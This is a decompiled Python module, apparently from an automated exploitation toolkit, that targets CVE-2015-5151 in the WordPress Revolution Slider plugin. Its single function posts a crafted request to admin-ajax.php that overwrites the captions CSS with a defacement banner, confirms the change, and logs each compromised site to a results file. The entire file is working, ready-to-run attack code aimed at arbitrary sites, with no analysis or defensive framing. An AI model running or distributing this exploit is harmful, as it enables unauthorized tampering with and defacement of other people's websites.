# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2015_5151_revsliderCSS.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    IndeXText = 'Vuln!! Patch it Now!'
    ency = {'action': 'revslider_ajax_action','client_action': 'update_captions_css',
       'data': "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'>" + IndeXText + "<p style='color: transparent'>"
       }
    try:
        url = 'http://' + site + '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css'
        aa = requests.post(url, data=ency, timeout=10, headers=Headers)
        if 'succesfully' in str(aa.content):
            deface = site + '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css'
            X = requests.get('http://' + deface, timeout=10, headers=Headers)
            if 'Vuln!!' in str(X.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(deface + '\n')
            return printModule.returnYes(site, 'CVE-2015-5151', 'Revslider CSS Injection', 'Wordpress')
        return printModule.returnNo(site, 'CVE-2015-5151', 'Revslider CSS Injection', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2015-5151', 'Revslider CSS Injection', 'Wordpress')